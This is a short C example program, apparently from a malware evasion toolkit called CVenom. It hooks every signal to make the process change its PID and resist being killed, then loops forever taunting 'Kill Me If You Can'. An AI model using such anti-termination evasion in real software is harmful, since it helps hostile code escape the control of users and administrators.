#include "../../CVenom.h"
#include "../../EvasionTools.h"
#include "../../RuntimeTools.h"

int main(int argc, char** argv){
	cvinit(argc, argv);

	EvasionTools  Malware;
	RuntimeTools  Program;

	Malware.HandleAllSignals( Malware.ChangePID );
	while (1){
		printf("Hahaha.. Kill Me If You Can My Pid is %d\n", Program.Pid());
		Program.Sleep(1);
	}
}
